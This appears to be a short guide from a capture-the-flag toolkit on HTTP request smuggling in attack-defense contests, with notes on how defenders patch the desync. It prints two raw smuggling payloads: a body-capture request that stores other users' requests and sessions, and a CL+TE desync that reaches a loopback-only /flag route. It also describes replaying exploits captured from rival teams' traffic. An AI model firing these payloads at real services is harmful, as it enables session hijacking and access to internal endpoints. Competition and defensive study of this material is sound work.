# Attack-defense — smuggling against a live service

## The shape — attack-defense is different from jeopardy

In attack-defense the target is a live service with a scoreboard — the
smuggle has to land RELIABLY, every tick, against every team's instance —
`tools/ad/` — the sibling plane.

## The reliable desync — the pair that always works

A one-off desync that works 1-in-N times isn't enough — the chain needs
a deterministic pair — measure the pair on YOUR service first, then
fire it against every team's — `tools/ad/flag_farm.py`.

## The cookie-steal — the team-flag exfil

```text
POST /store HTTP/1.1
Content-Length: 400

x=
```

The victim's request lands inside `x=` — `/store` stores the request —
the flag-value is inside — read `/store/last` — `session-hijack.md`.

## The internal-route — the flag endpoint

```text
POST / HTTP/1.1
Content-Length: 4
Transfer-Encoding: chunked

5c
GET /flag HTTP/1.1
Host: t
Content-Length: 15

x=1
0
```

`/flag` loopback-only — the smuggle reaches it — the flag in the response.

## The service-triage — `skills/ad-service-triage`

The AD router — routes to the desync's class — the triage names the
flag-store's path before the exploit — `tools/ad/tick.py`.

## The traffic-mine — stealing another team's smuggle

`tools/ad/traffic_mine.py` — captures another team's working smuggle
from your own traffic — `cap_split.py` splits the capture into requests —
replay it.

## The patch-side — how the defense closes the desync

The defender fixes the parser-disagreement:

- `nginx 1.17+` — strict-RFC — rejects CL+TE
- `haproxy` — normalizes TE
- the back-end — rejects ambiguous bodies
- `Connection: close` — removes the shared-socket requirement

The `ad-patch-without-breaking-sla` skill — patch without losing the
availability score.

## The reliability — the byte-count discipline

A smuggle that miscounts `Content-Length` hangs the connection — in AD
a hang is a lost tick — the byte-count MUST be exact — `cl-te-desync.md`.

## The self-test — `crlf_probe --selftest` + `tools/ad/selftest.py`

```bash
python3 tools/web/crlf_probe.py --selftest
python3 tools/ad/selftest.py
```

Both offline — the tool proves itself, the AD plane proves the decision
logic.
